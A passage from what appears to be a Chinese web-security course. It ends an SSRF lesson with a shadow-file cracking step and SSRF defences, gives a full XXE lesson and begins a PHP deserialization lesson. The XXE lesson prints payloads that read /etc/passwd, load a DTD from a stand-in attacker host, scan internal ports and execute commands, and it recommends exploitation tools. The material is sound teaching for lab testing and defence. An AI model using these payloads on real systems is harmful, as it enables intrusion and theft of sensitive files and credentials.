encrypted=seGvOG8nOp$LvZXXXXXXXENV2F6SEATplyE1QY33W2buEs10XLi.zQD8iwl.kCwsD.OMQ6WWkmUdu/9RPLHvLYSzMfcLj0
</pre>
</div>

<p>
接下来我们可以直接使用 john 去破解 shadow 文件：
</p>

<div class="org-src-container">
<pre class="src src-lang-java"># 安装John the Ripper
$ sudo apt install john 
$ john
John the Ripper password cracker, version 1.8.0
Copyright (c) 1996-2013 by Solar Designer
……
# 暴力破解获取的shadow文件中的账号密码
$ sudo john ./shadow
</pre>
</div>

<p>
之后就是时间的等待，暴力破解有时看运气了，运气好的话我们就拿到服务器的登录账号和密码了。
</p>

<p>
SSRFmap 会有一些问题，比如 Pikachu 靶场中的SSRF（curl）题目就没利用成
功，而且 portscan 利用模块开启后就死循环，停不下来。这些都是工具的Bug，
在测试时我们不能完全依赖工具，还是得自己多手工验证。
</p>
</div>
</div>
</div>
<div id="outline-container-ssrf-漏洞防御" class="outline-3">
<h3 id="ssrf-漏洞防御">SSRF 漏洞防御</h3>
<div class="outline-text-3" id="text-ssrf-漏洞防御">
<p>
有时基于业务功能需要，无法完全限制对外网络请求的功能，这就一定要依据业
务场景做一些灵活的变通，不可一刀切。
</p>

<p>
这里介绍一些常用的 SSRF 防御方法：
</p>

<ul class="org-ul">
<li>采用白名单限制，只允许访问特定的 IP 或域名，比如只允许访问拉勾网域名
​*.lagou.com；</li>

<li>限制内网 IP 访问，常见的内网 IP 段有 10.0.0.0 - 10.255.255.255、
172.16.0.0 - 172.31.255.255、192.168.0.0 - 192.168.255.255；</li>

<li>禁用一些不必要的协议，比如 <a href="file://、gopher://、dict://">file://、gopher://、dict://</a>。</li>
</ul>

<p>
另外关闭错误回显、关闭高危端口、及时修复漏洞，哪怕它是处于内网环境，都
有助于缓解SSRF 漏洞的进一步利用。
</p>
</div>
</div>
<div id="outline-container-总结" class="outline-3">
<h3 id="总结">总结</h3>
<div class="outline-text-3" id="text-总结">
<p>
这一讲我主要介绍了 SSRF漏洞的产生原理和危害，然后介绍了利用与绕过网站
限制的一些方法，最后介绍了SSRF 漏洞挖掘与防御方法。
</p>

<p>
从 SSRF 名字来看，很容易令人感觉这没有什么危害，甚至有些企业、政府金融
机构也认为有些网络请求是正常功能，因此觉得SSRF 不算漏洞。
</p>


<p>
Facebook 曾为一个 SSRF 漏洞支付过 31500 美金，相当于 20万人民币的奖励。 同时，在 2017 年 Orange Tsai分享的议题 “<a href="https://gsec.hitb.org/sg2017/sessions/a-new-era-of-ssrf-exploiting-url-parsers-in-trending-programming-languages/">A New Era of SSRF &#x2013; Exploiting URL Parsers in Trending Programming Languages</a>”，演示了利用 SSRF 漏洞实现 Github远程代码执行的攻击方法。 GitHub 为此奖励了 12500美金，该技术在当年的“<a href="https://portswigger.net/research/top-10-web-hacking-techniques-of-2017">Top 10 Web Hacking Techniques of 2017</a>”评选中获得第一名。这些都表明了 SSRF的危害，以及一 些国际大厂对 SSRF 漏洞的重视。
</p>

<p>
最近有位国外安全研究员在 Twitter 上公开了一张 SSRF漏洞的挖掘、利用、绕 过技术的总结图，这里推荐给你。<a href="https://twitter.com/TodayCyberNews/status/1591226736586674176">https://twitter.com/TodayCyberNews/status/1591226736586674176</a>
</p>


<figure id="org4e01c9a">
<img src="images/FhUsRYMaUAEUOVb.jpg" alt="FhUsRYMaUAEUOVb.jpg" width="100%">

</figure>

<p>
图 14：SSRF Search &amp; Destory
</p>

<p>
最后我要推荐一篇文章<a href="https://www.sohu.com/a/440098632_99907709">《SSRF引发的血案》</a>，通过信息收集、SSRF漏洞、旁站路
径泄露，最终获取目标网站的 root shell。这篇文章很有实战参考意义，既体
现出了信息收集的重要性，又表明了SSRF 的危害。
</p>

<p>
在 SSRF 漏洞的检测和防御中，如果你遇到了什么问题，欢迎在评论区留言。
</p>

<p>
下一讲，我将带你了解 XXE漏洞，它是一种帮助计算机理解信息符号并处理各种
信息的语言，主要用来传递结构化的数据信息。
</p>


<figure id="org2d60879">
<img src="./images/CgqCHmAADyOAB9URAAVCqo4Bquk815.png" alt="CgqCHmAADyOAB9URAAVCqo4Bquk815.png" width="80%">

</figure>
</div>
</div>
</section>
<section id="outline-container-h:a67a4345-e5f9-4b40-8cc2-5137f170aa56" class="outline-2">
<h2 id="h:a67a4345-e5f9-4b40-8cc2-5137f170aa56">XXE 漏洞：XML 解析器的坑</h2>
<div class="outline-text-2" id="text-h:a67a4345-e5f9-4b40-8cc2-5137f170aa56">
<p>
上一讲我们介绍了 SSRF漏洞，一种专门针对服务端的请求伪造攻击，常被用于
攻击内网。在里面我介绍了 Burp Collaborator 用于专门测试无回显漏洞的功能，
在本讲的 XXE漏洞测试中，我们依然可以使用，不知道你是否还记得怎么使用？
</p>

<p>
下面，我们就开始今天的课程，一场关于 XML
外部实体注入（XXE）漏洞的攻防之路。
</p>
</div>
<div id="outline-container-xxexml-外部实体注入" class="outline-3">
<h3 id="xxexml-外部实体注入">XXE：XML 外部实体注入</h3>
<div class="outline-text-3" id="text-xxexml-外部实体注入">
<p>
XXE（XML External Entity，XML外部实体注入）正是当允许引用外部实体时，
通过构造恶意内容，导致读取任意文件、执行系统命令、内网探测与攻击等危害
的一类漏洞。
</p>

<blockquote>
<p>
是不是想到了上节课讲的 SSRF？没错，利用 XXE 可以造成 SSRF。
</p>
</blockquote>

<p>
PHP 默认使用 libxml 来解析 XML，但是从 libxml 2.9.0开始，它默认不再解
析外部实体，导致 PHP 下的 XXE漏洞已经逐渐消失，除非你指定
LIBLXML_NOENT 去开启外部实体解析，才会存在 XXE 漏洞。
</p>

<div class="org-src-container">
<pre class="src src-lang-php">simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);
</pre>
</div>

<p>
本文也不打算再讲 PHP 环境下的 XXE 漏洞，Java 才是 XXE 漏洞最常见的语言，
因此主要以 Java 为例做一些介绍。但在漏洞利用的实例演示上，我依然用
Pikachu 靶场的 XXE题目（PHP），因为 XXE 在利用上与语言无关，无论是 php、
java 还是C、python，利用技巧都是一样的。
</p>
</div>
</div>
<div id="outline-container-那么什么是-xml" class="outline-3">
<h3 id="那么什么是-xml">那么，什么是 XML？</h3>
<div class="outline-text-3" id="text-那么什么是-xml">
<p>
XML（Extensible Markup Language）意为可扩展性标记语言，我将介绍下 XML
的一些基础知识，方便你更好地理解漏洞原理。
</p>
</div>
<div id="outline-container-xml-文档结构" class="outline-4">
<h4 id="xml-文档结构">1.XML 文档结构</h4>
<div class="outline-text-4" id="text-xml-文档结构">
<p>
XML 文档结构包括 XML声明、文档类型定义（DTD）、文档元素，具体可以参考
以下示例。
</p>

<div class="org-src-container">
<pre class="src src-lang-xml">&lt;!--XML声明--&gt;
&lt;?xml version="1.0"?&gt; 
&lt;!--文档类型定义--&gt;
&lt;!DOCTYPE people [  &lt;!--定义此文档是 people 类型的文档--&gt;
  &lt;!ELEMENT people (name,age,mail)&gt;  &lt;!--定义people元素有3个元素--&gt;
  &lt;!ELEMENT name (#PCDATA)&gt;     &lt;!--定义name元素为“#PCDATA”类型--&gt;
  &lt;!ELEMENT age (#PCDATA)&gt;   &lt;!--定义age元素为“#PCDATA”类型--&gt;
  &lt;!ELEMENT mail (#PCDATA)&gt;   &lt;!--定义mail元素为“#PCDATA”类型--&gt;
]]]&gt;
&lt;!--文档元素--&gt;
&lt;people&gt;
  &lt;name&gt;john&lt;/name&gt;
  &lt;age&gt;18&lt;/age&gt;
  &lt;mail&gt;john@qq.com&lt;/mail&gt;
&lt;/people&gt;
</pre>
</div>

<p>
三者其中，与 XXE漏洞相关的主要在于文档类型定义（DTD），所以下面主要重
点来介绍下 DTD。
</p>
</div>
</div>
<div id="outline-container-dtd-实体声明" class="outline-4">
<h4 id="dtd-实体声明">2.DTD 实体声明</h4>
<div class="outline-text-4" id="text-dtd-实体声明">
<p>
DTD（Document Type Definition，文档类型定义）用于定义 XML文档结构，包
括元素的定义规则、元素间的关系规则、属性的定义规则，其定义结构如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-xml">&lt;!DOCTYPE 根元素 [定义内容]&gt;
</pre>
</div>

<p>
DTD 实体就是变量，它既可以在文档内部声明，也可以外部引用，供在 XML 文
档里面去使用。
</p>

<ul class="org-ul">
<li><b>内部实体声明</b></li>
</ul>

<p>
内部声明采用如下格式定义：
</p>

<div class="org-src-container">
<pre class="src src-lang-xml">&lt;!ENTITY 实体名 "实体值"&gt;
</pre>
</div>

<p>
声明之后就可以通过“&amp;实体名;”来获取，示例如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-xml">&lt;!DOCTYPE foo [
  &lt;!ENTITY test "john"&gt;
]&gt;
&lt;root&gt;
  &lt;name&gt;&amp;test;&lt;/name&gt;
&lt;/root
</pre>
</div>

<ul class="org-ul">
<li><b>外部实体引用</b></li>
</ul>

<p>
XXE 的产生正是外部实体引用的结果，可分为普通实体和参数实体。
</p>

<p>
<b>（1）普通实体</b> 声明格式如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">&lt;!ENTITY 实体名 SYSTEM "URI"&gt;
或者
&lt;!ENTITY 实体名 PUBLIC "public_ID" "URI"&gt;
</pre>
</div>

<p>
举个例子：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;
    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
</pre>
</div>

<p>
声明实体 xxe，用于读取 /etc/passwd 文件，然后通过 &amp;xxe; 来引用执行。
</p>

<p>
<b>（2）参数实体</b> 声明主要用于后续使用，与普通实体不同的是，它中间有百分号字符（%），其声明格式如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">&lt;!ENTITY % 实体名称 "实体的值"&gt;
或者
&lt;!ENTITY % 实体名称 SYSTEM "URI"&gt;
</pre>
</div>

<p>
举个例子：
</p>

<div class="org-src-container">
<pre class="src src-lang-xml">&lt;!DOCTYPE foo [
    &lt;!ENTITY  % xxe SYSTEM "http://hacker.com/evil.dtd" &gt;
    %xxe;
]&gt;
&lt;root&gt;
    &lt;name&gt;&amp;evil;&lt;/name&gt;
&lt;/root&gt;
</pre>
</div>

<p>
xxe.dtd 内容如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-xml">&lt;!ENTITY evil SYSTEM "file:///etc/passwd"&gt;
</pre>
</div>

<p>
上面先声明 xxe 参数实体，引入外部实体 "<a href="http://hacker.com/evil.dtd">http://hacker.com/evil.dtd</a>" ，
里面声明了一个叫 evil 的实体，用于读取/etc/passwd 文件，最后在通过
&amp;evil; 来引用执行。
</p>

<p>
在不同的语言中其支持协议还不一样，需要根据业务场景来实测，常见的协议有
file、http、ftp、https、except 等等。
</p>
</div>
</div>
</div>
<div id="outline-container-危害xxe-的常见攻击手段" class="outline-3">
<h3 id="危害xxe-的常见攻击手段">危害：XXE 的常见攻击手段</h3>
<div class="outline-text-3" id="text-危害xxe-的常见攻击手段">
<p>
下面介绍一些 XXE 漏洞的常见利用方法，并提供一些 payload 测试用例，测试
仍以 Pikachu XXE 题目作为演示。
</p>
</div>
<div id="outline-container-内网攻击" class="outline-4">
<h4 id="内网攻击">1.内网攻击</h4>
<div class="outline-text-4" id="text-内网攻击">
<p>
XXE 支持 http 等 URL，所以同样可以产生与 SSRF 一样效果，对内网进行指纹
探测、端口扫描、漏洞攻击等行为。
</p>

<p>
比如以下的 payload：
</p>

<p>
通过一个 SYSTEM 指定一个 URL 进行访问
</p>

<div class="org-src-container">
<pre class="src src-lang-xml">&lt;?xml version = "1.0"?&gt;
&lt;!DOCTYPE ANY [
    &lt;!ENTITY xxe SYSTEM "http://192.168.31.124:4444/test"&gt;
]&gt;
&lt;x&gt;&amp;xxe;&lt;/x&gt;&lt;/r&gt;
</pre>
</div>

<p>
由于不存在该端口，所以会出错误：
</p>


<figure id="orgd10b547">
<img src="./images/CgqCHmAGWcqAO_PgAASscDOp6uA731.png" alt="CgqCHmAGWcqAO_PgAASscDOp6uA731.png" width="80%">

</figure>

<p>
图 1 探测内网端口失败
</p>

<p>
成功的话，会返回空白，通过这种对比差异，可以判断是否利用成功：
</p>


<figure id="org37153d1">
<img src="./images/Cip5yGAGWdyAQDS2AANXkfuguok138.png" alt="Cip5yGAGWdyAQDS2AANXkfuguok138.png" width="80%">

</figure>

<p>
图 2 探测内网端口成功
</p>
</div>
</div>
<div id="outline-container-读取本地文件" class="outline-4">
<h4 id="读取本地文件">2.读取本地文件</h4>
<div class="outline-text-4" id="text-读取本地文件">
<p>
通过 <a href="file://">file://</a> 可以读取本地文件，造成敏感文件泄露：
</p>

<div class="org-src-container">
<pre class="src src-lang-xml">&lt;?xml version = "1.0"?&gt;
&lt;!DOCTYPE ANY [
    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;x&gt;&amp;xxe;&lt;/x&gt;
</pre>
</div>

<p>
输入上述 XML 提交后，成功读取到 /etc/passwd 文件内容：
</p>


<figure id="org5bf5aa8">
<img src="./images/CgpVE2AABv6AfyHcAAGL6fVMVng679.png" alt="CgpVE2AABv6AfyHcAAGL6fVMVng679.png" width="80%">

</figure>

<p>
图 3 利用XXE漏洞读取 /etc/passwd
</p>
</div>
</div>
<div id="outline-container-远程执行命令" class="outline-4">
<h4 id="远程执行命令">3.远程执行命令</h4>
<div class="outline-text-4" id="text-远程执行命令">
<p>
如果是 PHP 环境下并安装 except扩展，就可以利用它执行系统命令了。这种情
况现在已经比较少见了，更多还是要利用其他漏洞来实现命令或代码执行。
</p>

<div class="org-src-container">
<pre class="src src-lang-java">&lt;?xml version = "1.0"?&gt;
&lt;!DOCTYPE ANY [
    &lt;!ENTITY xxe SYSTEM "except://id"&gt;
]&gt;
&lt;x&gt;&amp;xxe;&lt;/x&gt;
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-xxe-漏洞利用工具" class="outline-3">
<h3 id="xxe-漏洞利用工具">XXE 漏洞利用工具</h3>
<div class="outline-text-3" id="text-xxe-漏洞利用工具">
</div>
<div id="outline-container-xxeinjector" class="outline-4">
<h4 id="xxeinjector">1.XXEinjector</h4>
<div class="outline-text-4" id="text-xxeinjector">
<p>
推荐一款综合型的 XXE漏洞利用工具<a href="https://github.com/enjoiz/XXEinjector">XXEinjector</a>，用Ruby 开发，运行前需要先
安装 ruby。
</p>

<div class="org-src-container">
<pre class="src src-lang-java">sudo apt install ruby
</pre>
</div>

<p>
通过输入请求包数据，并指定攻击行为，比如列目录、读文件等。
</p>

<div class="org-src-container">
<pre class="src src-lang-java">$ cat req.txt                                                                                    1 ↵
GET /mmpaymd/ordercallback HTTP/1.1
Host: 100.95.204.69:8081
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh,zh-CN;q=0.9,en;q=0.8
Cache-Control: max-age=259200
Connection: keep-alive
</pre>
</div>

<p>
常用命令如下：
</p>


<figure id="org958bec4">
<img src="./images/Cip5yGAABwiAda6kAAF5gVHcGUo024.png" alt="Cip5yGAABwiAda6kAAF5gVHcGUo024.png" width="80%">

</figure>

<p>
图 4 XXEinjector 常用命令
</p>

<p>
不过，不能完全依赖于XXEinjector，因为之前我在测试时，发现它也有利用不
成功的情况，需要自己多测试验证下。
</p>

<p>
其他更多 XXE payload，可以参考<a href="https://github.com/payloadbox/xxe-injection-payload-list">“XML External Entity (XXE) Injection
Payload List”</a>。
</p>
</div>
</div>
<div id="outline-container-xxexploiter" class="outline-4">
<h4 id="xxexploiter">2.XXExploiter</h4>
<div class="outline-text-4" id="text-xxexploiter">
<p>
如果你记不住上面那些 XXE payload，还有个工具可以帮你生成，一款集
payload生成与发包利用的 XXE 利用工具<a href="https://github.com/luisfontes19/xxexploiter">XXExploiter</a>，它可以启动服务提供远
程DTD 文件去实现利用。
</p>

<p>
比如像下图利用 xxexploiter 读取文体
</p>

<div class="org-src-container">
<pre class="src src-sh">xxexploiter file /tmp/test.txt -x /tmp/req
</pre>
</div>


<figure id="org2f55e20">
<img src="./images/CgpVE2AGWfCAdbhhAAQe4lr3PMM251.png" alt="CgpVE2AGWfCAdbhhAAQe4lr3PMM251.png" width="80%">

</figure>

<p>
图 5 xxeploiter 利用方法
</p>

<p>
就功能而言，个人觉得它比 XXEinjector 更优秀，生成 payload 的功能还可以
用于辅助手工测试，结合业务场景自己做一些调整。
</p>
</div>
</div>
</div>
<div id="outline-container-xxe-漏洞挖掘" class="outline-3">
<h3 id="xxe-漏洞挖掘">XXE 漏洞挖掘</h3>
<div class="outline-text-3" id="text-xxe-漏洞挖掘">
</div>
<div id="outline-container-黑盒测试" class="outline-4">
<h4 id="黑盒测试">1.黑盒测试</h4>
<div class="outline-text-4" id="text-黑盒测试">
<p>
XXE 依然如 SSRF 分为有回显、无回显。通过 XXE 可以造成SSRF，所以它的检
测思路与 SSRF 大同小异，比较通用的方式也是构造特定外网服务器的访问请求，
然后查询外网服务器的请求日志，以判断是否请求成功。
</p>

<p>
无论是手工测试还是自动化，当前检测 XXE 和 SSRF 漏洞的方式大多是基于此
原理。
</p>

<p>
上一讲介绍的 Burp Collaborator，在此处就用得上，使用前面介绍的常见攻击
手段，去尝试构造多种测试请求，是否向 Burp Collaborator Server 请求成功，
就可以很容易地判断是否存在 XXE。
</p>

<p>
以 Pikachu 靶场的 XXE 题目为例。用 Burp Collaborator 获得 DNS解析服务
器的地址 b5hcm1ypwg6bvqnxtm6iyqao9ff53u.burpcollaborator.net，然后构造
XXE payload。
</p>

<div class="org-src-container">
<pre class="src src-lang-xml">&lt;?xml version = "1.0"?&gt;
&lt;!DOCTYPE ANY [
    &lt;!ENTITY xxe SYSTEM "http://b5hcm1ypwg6bvqnxtm6iyqao9ff53u.burpcollaborator.net"&gt;
]&gt;
&lt;x&gt;&amp;xxe;&lt;/x&gt;
</pre>
</div>

<p>
将上述 payload 输入文本框，点“提交”：
</p>


<figure id="org0281406">
<img src="./images/Cip5yGAGWgSAfTxdAAR6XBUFZa4113.png" alt="Cip5yGAGWgSAfTxdAAR6XBUFZa4113.png" width="80%">

</figure>

<p>
图 6 输入 xml payload
</p>

<p>
在 Burp Collaborator client 上点击“Poll now”就可以看到请求日志，说明
确实存在 XXE 漏洞。
</p>


<figure id="org3ed7a08">
<img src="./images/Cip5yGAAByaANi3-AAE7G8SiyNI515.png" alt="Cip5yGAAByaANi3-AAE7G8SiyNI515.png" width="80%">

</figure>

<p>
图 7 利用 XXE 请求 Collaborator server 成功
</p>
</div>
</div>
<div id="outline-container-白盒审计" class="outline-4">
<h4 id="白盒审计">2.白盒审计</h4>
<div class="outline-text-4" id="text-白盒审计">
<p>
以 Java 为例，可以在代码中搜索常用的 XML
解析器，看它们在实例化之后，是否有关闭外部实体引用功能，如果没有就可能存在
XXE 漏洞。
</p>

<div class="org-src-container">
<pre class="src src-lang-java">javax.xml.parsers.DocumentBuilderFactory;
javax.xml.parsers.SAXParser
javax.xml.transform.TransformerFactory
javax.xml.validation.Validator
javax.xml.validation.SchemaFactory
javax.xml.transform.sax.SAXTransformerFactory
javax.xml.transform.sax.SAXSource
org.xml.sax.XMLReader
DocumentHelper.parseText
DocumentBuilder
org.xml.sax.helpers.XMLReaderFactory
org.dom4j.io.SAXReader
org.jdom.input.SAXBuilder
org.jdom2.input.SAXBuilder
javax.xml.bind.Unmarshaller
javax.xml.xpath.XpathExpression
javax.xml.stream.XMLStreamReader
org.apache.commons.digester3.Digester
rg.xml.sax.SAXParseExceptionpublicId
</pre>
</div>

<p>
这部分可以结合 <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">“XML External Entity Prevention Cheat Sheet”</a> 来看，不
同语言、不同的 XML 解析库有不同的关闭外部实体引用的方法，在代码审计时，
可以对照着看，然后拿 一些xxe payload 实际验证下。
</p>
</div>
</div>
</div>
<div id="outline-container-防御-xxe-漏洞" class="outline-3">
<h3 id="防御-xxe-漏洞">防御 XXE 漏洞</h3>
<div class="outline-text-3" id="text-防御-xxe-漏洞">
<p>
要防御 XXE 也比较简单， <b>关闭外部实体引用即可</b> 。比如在 Java 中常用于
解析XML 的 DocumentBuilderFactory，就可以通过 setFeature 方法防御 XXE
漏洞，注意是组合使用，而不是单一防御。
</p>

<div class="org-src-container">
<pre class="src src-lang-java">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
String FEATURE = null;
try {
    // 禁用DTD
    FEATURE = "http://apache.org/xml/features/disallow-doctype-decl";
    dbf.setFeature(FEATURE, true);

    // 禁用普通实体
    FEATURE = "http://xml.org/sax/features/external-general-entities";
    dbf.setFeature(FEATURE, false);

    // 禁用参数实体
    FEATURE = "http://xml.org/sax/features/external-parameter-entities";
    dbf.setFeature(FEATURE, false);

    // 禁用外部DTD引用
    FEATURE = "http://apache.org/xml/features/nonvalidating/load-external-dtd";
    dbf.setFeature(FEATURE, false);

    // 禁用XInclude处理功能
    dbf.setXIncludeAware(false);

    // 禁用扩展实体引用节点，注意：只使用该方法并不能完全防御XXE
    dbf.setExpandEntityReferences(false);
} catch () {
  ...
}
   // Load XML file or stream using a XXE agnostic configured parser...
   DocumentBuilder safebuilder = dbf.newDocumentBuilder();
</pre>
</div>

<p>
不同的 XML 解析库有不同的关闭方式，比如全面介绍 XXE 防御方案的是 OWASP
发表的<a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">“XML External Entity Prevention Cheat Sheet”</a>，针对不同的语言、
XML解析库，给出不同的防御方案，并提供关闭 XML实体引用的代码示例，你在
防御或者需要修复 XXE 漏洞时可以作为参考。
</p>

<p>
如果业务需要引用外部实体，建议采用白名单方式限制。
</p>
</div>
</div>
<div id="outline-container-小结" class="outline-3">
<h3 id="小结">小结</h3>
<div class="outline-text-3" id="text-小结">
<p>
本节课介绍了 XXE（XML实体注入）漏洞相关的基础知识、漏洞成因和常见攻击
手段，有时需要根据有无回显的情况，采取不同的测试方法。
</p>

<blockquote>
<p>
在日常实际应用中，大家都习惯当作无回显的情况来看待，因为无回显的检测方
法同样适用于有回显的，相对比较通用。
</p>
</blockquote>

<p>
同时，给你推荐了 XXEinjector 和 XXExploiter 两款利用工具，在辅助检测
XXE漏洞时会有所帮助。个人更偏好用XXExploiter，因为它功能更多，利用成功
率更高一些，还可以生成 payload用于测试。
</p>

<p>
Burp Collaborator 在检测无回显的 XXE 漏洞时，非常好用，结合
XXExploiter生成的 payload，对其中的 URL 调整为 Burp Collaborator 
Server，借助 Burp Collaborator 的自动检测服务端的请求日志，可以帮助判断
漏洞是否存在，又不用再自己搭建外网服务器，是一种节约成本的检测方法。
</p>
</div>
</div>
</section>
<section id="outline-container-h:92f9eff3-952d-481b-b0f4-153cba29be73" class="outline-2">
<h2 id="h:92f9eff3-952d-481b-b0f4-153cba29be73">反序列化漏洞：数据转换下的欺骗</h2>
<div class="outline-text-2" id="text-h:92f9eff3-952d-481b-b0f4-153cba29be73">
<p>
上一讲介绍了 XXE漏洞，它在业务场景中很容易用于读取敏感文件、进行代码执
行，甚至也会用来渗透内网，也因此XXE 漏洞常被当作一种严重漏洞来对待。
</p>

<p>
本讲我将介绍另一种常用来实现远程代码执行的漏洞类型-&#x2014; <b>反序列化漏洞</b>
，这几年经常出现在Java 公共库，比如阿里的 fastjson，还有一些 Java 应用
服务器，比如 JBoss 。PHP 也有反序列化，比如著名的 Joomla内容管理系统很多
编程语言都有这种反序列化功能，若对反序列化的数据未做有效过滤和限制，就
可能导致这种漏洞的产生。
</p>

<p>
下面我就详细给你介绍下关于反序列化漏洞攻防的方方面面，演示案例我依然会
以 PHP 为例，方便大家学习。
</p>
</div>
<div id="outline-container-序列化与反序列化" class="outline-3">
<h3 id="序列化与反序列化">序列化与反序列化</h3>
<div class="outline-text-3" id="text-序列化与反序列化">
<p>
为什么会有序列化与反序列化的需求呢？
</p>

<p>
序列化是把对象转换成有序字节流，通常都是一段可阅读的字符串，以便在网络
上传输或者保存在本地文件中。同样，如果我们想直接使用某对象时，就可能通
过反序列化前面保存的字符串，快速地重建对象，也不用重写一遍代码，提高工
作效率。
</p>

<p>
以 PHP 语言为例，下面以代码示例介绍下序列化与反序列化，帮助你更直观地理
解两者的概念。
</p>
</div>
<div id="outline-container-序列化示例" class="outline-4">
<h4 id="序列化示例">1.序列化示例</h4>
<div class="outline-text-4" id="text-序列化示例">
<p>
PHP 中通过 serialize函数进行序列化操作，先定义个类，然后用它创建个类对
象再序列化，代码示例如下：
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;?php
  class People{
      public $<span style="color: #a0522d;">id</span> = 1;
      protected $<span style="color: #a0522d;">name</span> = <span style="color: #8b2252;">"john"</span>;
      private $<span style="color: #a0522d;">age</span> = 18;
  }

  $<span style="color: #a0522d;">obj</span> = new People();
  <span style="color: #483d8b;">echo</span> serialize($<span style="color: #a0522d;">obj</span>);
?&gt;
</pre>
</div>

<p>
我在 PHP 7.4.3 版本下执行，它会输出以下这段字符串：
</p>

<div class="org-src-container">
<pre class="src src-sh">$ php -v
PHP 7.4.3 (cli) (built: Oct  6 2020 15:47:56) ( NTS )
<span style="color: #0000ff;">Copyright</span> (c) The PHP Group
Zend Engine v3.4.0, Copyright (c) Zend Technologies
    with Zend OPcache v7.4.3, Copyright (c), by Zend Technologies
$ php test.php 
<span style="color: #8b2252;">'O:6:"People":3:{s:2:"id";i:1;s:7:" * name";s:4:"john";s:11:" People age";i:18;}'</span>
</pre>
</div>

<p>
注意：有些终端在输出时，可能会把其中的 \x00 过滤掉，"Peopleage" 其实是
"\x00People\x00age"这样的数据，在后面进行反序列化操作时要注意，可拿前
面的变量名长度进行对比。
</p>

<p>
对生成后序列化字符串前半部分做个解释，后面类似：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">O：代表对象Object
6：对象名称长度
People：对象名称
3：变量个数
s：数据类型
2：变量名长度
id：变量名
i：整数类型
1：变量值
</pre>
</div>

<p>
序列化后有很多数据类型的表示，你先提前了解一下，以后写反序列化利用时有可能会用到。
</p>

<pre class="example" id="orga55e5fd">
a - array 数组型
b - boolean 布尔型
d - double 浮点型
i - integer 整数型
o - common object 共同对象
r - objec reference 对象引用
s - non-escaped binary string 非转义的二进制字符串
S - escaped binary string 转义的二进制字符串
C - custom object 自定义对象
O - class 对象
N - null 空
R - pointer reference 指针引用
U - unicode string Unicode 编码的字符串
</pre>

<p>
相信到这里，你对所谓的序列化操作有了直观的认识感受，它就是将对象转换成
可阅读可存储的字符串序列。
</p>
</div>
</div>
<div id="outline-container-反序列化示例" class="outline-4">
<h4 id="反序列化示例">2.反序列化示例</h4>
<div class="outline-text-4" id="text-反序列化示例">
<p>
反序列化就是对前面的序列化的反向操作，即将字符串序列重建回对象。
</p>

<p>
现在我们将前面生成的序列化字符串进行反序列化操作，通过 unserialize()函
数来实现：
</p>

<div class="org-src-container">
<pre class="src src-lang-php">&lt;?php
  $str = 'O:6:"People":3:{s:2:"id";i:1;s:7:" * name";s:4:"john";s:11:" People age";i:18;}';
  $u = unserialize($str);
  echo $u-&gt;id;
?&gt;
</pre>
</div>

<p>
执行之后，成功获取到 People 的属性 id值，说明反序列化重建出来的对象是
可用的：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">$ php test.php
1
</pre>
</div>

<p>
如果你访问 $name 与 $age 就会出错，因为它们不是公有属性，不可直接访问：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">PHP Fatal error:  Uncaught Error: Cannot access private property People::$age in /tmp/test.php:14
Stack trace:
#0 {main}
  thrown in /tmp/test.php on line 14
PHP Fatal error:  Uncaught Error: Cannot access protected property People::$name in /tmp/test.php:14
Stack trace:
#0 {main}
  thrown in /tmp/test.php on line 14
</pre>
</div>

<p>
这里主要介绍的是 PHP 的序列化与反序列化，很多语言也都有这种功能，我在后
面的“扩展：其他语言的反序列化”小节中做了补充，你可以继续去探索下其他
语言。
</p>
</div>
</div>
</div>
<div id="outline-container-漏洞是如何产生的" class="outline-3">
<h3 id="漏洞是如何产生的">漏洞是如何产生的？</h3>
<div class="outline-text-3" id="text-漏洞是如何产生的">
<p>
反序列化原本只是一个正常的功能，那为什么反序列化就会产生漏洞呢？
</p>

<p>
当传给 unserialize() 的参数由外部可控时，若攻击者通过传入一个精心构造
的序列化字符串，从而控制对象内部的变量甚至是函数，比如PHP中特殊的 <b>魔
术方法</b> （详见下文），这些方法在某些情况下会被自动调用，为实现任意代码
执行提供了条件，这时反序列化漏洞就产生了，PHP反序列化漏洞有时也被称为
“PHP 对象注入”漏洞。
</p>
</div>
</div>
<div id="outline-container-攻击反序列化漏洞" class="outline-3">
<h3 id="攻击反序列化漏洞">攻击反序列化漏洞</h3>
<div class="outline-text-3" id="text-攻击反序列化漏洞">
<p>
反序列化参数可控后，如果我们只能针对参数的类对象进行利用，那么攻击面就
太小了。这时利用 <b>魔术方法</b> 就可以扩大攻击面，它在该类的序列化或反序列
化中就可能自动完成调用，对于漏洞的利用可以直到关键作用。
</p>

<p>
除此之外，还有后面将介绍到的 POP 链构造等手法都可以进一步扩大攻击面，达
到代码执行的效果。
</p>
</div>
<div id="outline-container-利用魔术方法" class="outline-4">
<h4 id="利用魔术方法">1.利用魔术方法</h4>
<div class="outline-text-4" id="text-利用魔术方法">
<p>
魔术方法就是 PHP中一些在某些情况下会被自动调用的方法，无须手工调用，比
如当一个对象创建时__construct 会被调用，当一个对象销毁时 __destruct 会
被调用。
</p>

<p>
